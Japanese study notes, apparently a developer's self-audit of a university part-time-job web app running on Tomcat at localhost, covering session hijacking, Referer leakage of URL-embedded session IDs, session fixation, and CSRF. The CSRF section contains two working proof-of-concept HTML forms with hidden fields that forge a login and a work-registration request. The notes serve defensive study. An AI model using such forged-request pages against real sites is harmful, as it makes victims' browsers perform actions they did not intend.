## セッションハイジャック

### セッションハイジャックの分類
- セッションIDの推測
- セッションIDの盗み出し<br/>
→ XSS、HTTP・ヘッダインジェクション、Refererの悪用
- セッションIDの強制<br/>
→ セッションの固定化攻撃

---

### Refererの悪用
#### 条件：
- セッションIDをURL埋め込みにしている
- 罠サイトへのリンクがある

#### 被害者視点：
1. 学内バイトシステムにログインする
2. 学内バイトシステム内で罠サイトのリンクを踏む
3. Referer（参照元サイトのURL）から、セッションIDを盗まれる

#### TomcatのセッションIDの設定
| セッションIDの保存場所          | application.propertiesのserver.servlet.session.tracking-modes |
|-----------------------|--------------------------------------------------------------|
| デフォルト（URL埋め込み+Cookie） |                                                              |
| URL埋め込み               | url                                                          |
| Cookie                | cookie                                                       |
| SSL                   | ssl                                                          |

- URL埋め込みだとlocalhost:8080/Sign;jsessionid=qwert...みたいなかんじ
- デフォルトの設定だと、Cookieが有効なブラウザの場合はCookie、
Cookieが無効なブラウザの場合はURL埋め込み
- CookieのみにするとCookieが無効なブラウザではログインもできない
- 今回は外部サイトへのリンクがないため、どのみち危険性はない...と思う
- たぶん、Solomonはデフォルト（外部サイトへのリンクはないため）、
科技大のポータルサイトはCookieのみ（外部サイトへのリンクを貼るため）



---

### セッションIDの固定化攻撃（対策済み）
#### 条件：
- サーバーがURL埋め込みのセッションIDを受け付ける

#### 攻撃者視点：
1. localhost:8080/Sign;jsessionid=ABCというリンクを貼る
2. このURLからログインしたユーザーになりすます

PHPやASP.NETだと未知のセッションIDを受け付ける。これをセッションアダプションというらしい。<br/>
Tomcatにはセッションアダプションがないため、勝手に作ったセッションIDは無視される。
よって危険性はなし。

---
---

### クロスサイト・リクエスト・フォージェリ（CSRF）
（別名：シーサーフ、XCRF、リクエスト強要、セッションライティング）<br/>
クエリ文字列とFormDataが同じになるようなHTTPリクエストを送るとできる。たぶん

#### 条件：
- CSRF対策をしていない

#### 被害者視点：
1. ログインする
2. ブラウザの別のタブで罠リンクを踏む
3. HTTPリクエストが送られる

#### ログイン前
```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
</head>
<body>
<form action="http://localhost:8080/Sign?-1.-userInfo" method="POST">
	<input type="hidden" name="userName" value="username"/>
	<input type="hidden" name="userPass" value="password"/>
	<input type="submit"/>
</form>
</body>
</html>
```

```http request
Query String Parameters:
 -1.-userInfo

Form Data:
 userName: username
 userPass: password
```

#### ログイン後（学内バイト登録）
```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
</head>
<body>
<form action="http://localhost:8080/Request?-1.0-ptjdetail-sendButton&date=2022-07-04" method="POST">
	<input type="hidden" name="date" value="2022-07-04"/>
	<input type="hidden" name="workingType" value="0"/>
	<input type="hidden" name="workingSubject" value="0"/>
	<input type="hidden" name="workingStartHours_pre" value="0"/>
	<input type="hidden" name="workingStartMinutes_pre" value="0"/>
	<input type="hidden" name="workingEndHours_pre" value="0"/>
	<input type="hidden" name="workingEndMinutes_pre" value="1"/>
	<input type="hidden" name="breakTime" value="0"/>
	<input type="hidden" name="sumworkinghours" value="0.25"/>
	<input type="hidden" name="workingcontent" value="0"/>
	<input type="submit" name="sendButton" value="1" />
</form>
</body>
</html>
```

```http request
Query String Parameters:
 -1.0-ptjdetail-sendButton&date=2022-07-0

Form Data:
 date: 2022-07-04
 workingType: 0
 workingSubject: 0
 workingStartHours_pre: 0
 workingStartMinutes_pre: 0
 workingEndHours_pre: 0
 workingEndMinutes_pre: 1
 breakTime: 0
 sumworkinghours: 0.25
 workingcontent: 0
 sendButton: 1
```

- 機能に沿った形でリクエストを送ることしかできないから、嫌がらせ程度
（通販サイトなら勝手に商品購入とかできる）

#### 対策
調査中...
Sec-Fetch-Site: cross-site

---

### サイドチャネル攻撃
調査中...

参考資料：体系的に学ぶ安全なwebアプリケーションの作り方
（ほとんどphpだからあんまり参考にはならない、あと長くてしんどい）